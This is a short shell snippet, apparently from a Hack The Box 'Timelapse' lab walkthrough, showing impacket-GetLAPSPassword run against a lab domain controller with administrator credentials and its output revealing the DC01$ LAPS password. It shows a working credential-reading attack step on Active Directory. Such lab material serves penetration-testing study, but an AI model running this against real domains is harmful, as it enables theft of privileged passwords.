```sh
└─$ impacket-GetLAPSPassword -ts -debug -dc-ip 10.129.227.113 'timelapse.htb/administrator:7@r[+C)c%/+9H2A9VQR.@D2D'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-10-02 08:58:08] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-10-02 08:58:08] [+] Connecting to 10.129.227.113, port 389, SSL False
[2025-10-02 08:58:10] [+] Total of records returned 4
Host   LAPS Username  LAPS Password             LAPS Password Expiration  LAPSv2 
-----  -------------  ------------------------  ------------------------  ------
DC01$  N/A            7@r[+C)c%/+9H2A9VQR.@D2D  2025-10-07 14:46:09       False 
```
